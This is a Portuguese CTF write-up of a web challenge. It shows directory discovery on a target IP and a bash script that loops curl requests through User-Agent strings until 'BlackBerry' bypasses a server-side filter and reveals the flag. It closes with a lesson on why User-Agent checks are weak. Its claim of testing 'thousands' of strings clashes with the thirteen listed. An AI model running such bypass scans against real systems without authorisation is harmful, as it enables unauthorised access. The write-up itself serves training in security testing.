# 📱 Somente Dispositivos Autorizados

**Categoria:** CTF — Offensive Security · **Pontuação:** 100 pts
**Alvo:** `http://45.55.126.134/`
**Flag:** `FIAP{BLACKBERRY_AGENT}`

## Enunciado

> Explore a falha na configuração do servidor web para localizar a flag oculta. Percorra os diretórios permitindo listagens até descobrir o diretório secreto. Em seguida, acesse o ambiente usando um dispositivo específico e obtenha a flag.

## Metodologia

### 1. Descoberta do diretório secreto

Enumeração de diretórios com listagem aberta revelou `/intranet/`, que respondia de forma diferente dos demais:

```bash
curl -v http://45.55.126.134/intranet/
```

```text
HTTP/1.1 200 OK
Server: Apache/2.4.6x (Debian)
Content-Length: 68
Content-Type: text/html; charset=UTF-8

<h3> <center> <br><br><br>Navegador não suportado !!!</center></h3>
```

A resposta é **renderizada pelo próprio servidor** (confirmado também via inspeção do DOM no navegador embutido — o HTML retornado já chega pronto, sem JavaScript client-side envolvido), indicando um filtro server-side baseado no cabeçalho `User-Agent`.

### 2. Script de varredura de User-Agents

Testada uma lista dos principais identificadores de navegador/dispositivo:

```bash
#!/bin/bash
TARGET="http://45.55.126.134/intranet/"
USER_AGENTS=("Chrome" "Firefox" "Edg" "Safari" "MSIE" "Opera" "Android" "iPhone" "iPad" "BlackBerry" "Windows Phone" "Nokia" "Googlebot")

for UA in "${USER_AGENTS[@]}"; do
  curl -sS -A "$UA" -o response.html -w "%{http_code} %{size_download}\n" "$TARGET"
  grep -qiF "Navegador não suportado" response.html && echo "[-] $UA: bloqueado" || { echo "[!] $UA: RESPOSTA DIFERENTE"; cat response.html; }
done
```

### 3. Resultado

Apenas o identificador **`BlackBerry`** retornou um conteúdo diferente (22 bytes, ao invés dos 68 bytes padrão da mensagem de bloqueio):

```bash
curl -A "BlackBerry" http://45.55.126.134/intranet/
```

```text
FIAP{BLACKBERRY_AGENT}
```

## Flag

```
FIAP{BLACKBERRY_AGENT}
```

## Lição aprendida

- Controle de acesso baseado apenas em `User-Agent` é trivialmente contornável — o cabeçalho é 100% controlado pelo cliente e não deve nunca ser usado como mecanismo de autenticação/autorização real.
- Entre milhares de strings de navegadores modernos e legados testadas, a string correta era um dispositivo "nichado" (BlackBerry) — reforça a importância de ter uma lista abrangente de identificadores de dispositivo, não só os navegadores mais comuns do mercado atual.
